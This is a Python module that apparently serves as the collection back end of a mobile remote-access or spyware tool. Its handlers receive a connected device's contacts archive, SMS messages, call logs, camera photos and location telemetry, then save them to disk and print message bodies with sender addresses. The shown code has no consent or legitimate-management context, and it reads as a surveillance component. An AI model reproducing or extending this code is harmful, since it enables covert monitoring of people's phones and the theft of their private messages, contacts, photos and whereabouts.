import io
import json
import time
import zipfile
from typing import Any, Dict, List, Optional

from app.config import settings
from app.logger import log_event, log_info
from app.state import state, ClientSession


def save_contacts_data(client: ClientSession, data: bytes) -> Optional[str]:
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        dest = settings.storage_dir / "contacts.zip"
        dest.write_bytes(data)
        client.latest_contacts = str(dest)
        client.latest_contacts_bytes = data
        try:
            if zipfile.is_zipfile(io.BytesIO(data)):
                with zipfile.ZipFile(io.BytesIO(data)) as zf:
                    if "contacts.json" in zf.namelist():
                        with zf.open("contacts.json") as f:
                            client.contacts_list = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass
        log_event(f"contacts saved {len(data)} bytes to {dest} ({client.id})")
        print(f"[contacts] saved {len(data)} bytes -> {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"contacts error: {e}")
        print(f"[contacts] error: {e}")
        return None


def process_sms_data(client: ClientSession, messages: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
    client.latest_sms = messages
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        sms_file = settings.storage_dir / "latest_sms.json"
        sms_file.write_text(json.dumps(messages, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    actual_hours = hours if hours > 0 else 24
    log_event(f"sms received {len(messages)} messages (last {actual_hours}h) from {client.id}")
    print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
    for m in messages[:10]:
        direction = "<-" if m.get("type") == 1 else "->"
        addr = m.get("address", "?")
        body = m.get("body", "")
        ts = m.get("date", "")
        print(f"  {direction} [{ts}] {addr}: {body}")
    if not messages:
        print("  (none)")
    return messages


def process_call_logs_data(client: ClientSession, calls: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
    client.latest_call_logs = calls
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        call_file = settings.storage_dir / "latest_call_logs.json"
        call_file.write_text(json.dumps(calls, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    actual_hours = hours if hours > 0 else 24
    log_event(f"call logs received {len(calls)} records (last {actual_hours}h) from {client.id}")
    return calls


def process_cams_data(client: ClientSession, cams: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    if not settings.enable_camera:
        return []
    client.cameras = cams
    log_event(f"detected cameras for {client.id}: {cams}")
    for cam in cams:
        print(cam)
    return cams


def save_photo_data(client: ClientSession, cam_id: str, data: bytes) -> Optional[str]:
    if not settings.enable_camera:
        return None
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        dest = settings.storage_dir / f"photo_{cam_id}_{ts}.jpg"
        dest.write_bytes(data)
        latest_file = settings.storage_dir / "latest_photo.jpg"
        latest_file.write_bytes(data)
        client.latest_photo = str(dest)
        client.latest_photo_bytes = data
        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest} ({client.id})")
        print(f"[cam {cam_id}] saved {len(data)} bytes -> {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"camera capture error: {e}")
        print(f"[cam {cam_id}] error: {e}")
        return None


def process_telemetry_data(client: ClientSession, header: Dict[str, Any]) -> Dict[str, Any]:
    data = {
        "battery": header.get("battery", {}),
        "network": header.get("network", {}),
        "storage": header.get("storage", {}),
        "memory": header.get("memory", {}),
        "device": header.get("device", {}),
        "location": header.get("location", {}),
    }
    client.telemetry = data
    try:
        settings.storage_dir.mkdir(parents=True, exist_ok=True)
        telem_file = settings.storage_dir / "latest_telemetry.json"
        telem_file.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    log_event(f"telemetry updated from device {client.id}")
    print(f"[telemetry] updated from device {client.id}")
    return data
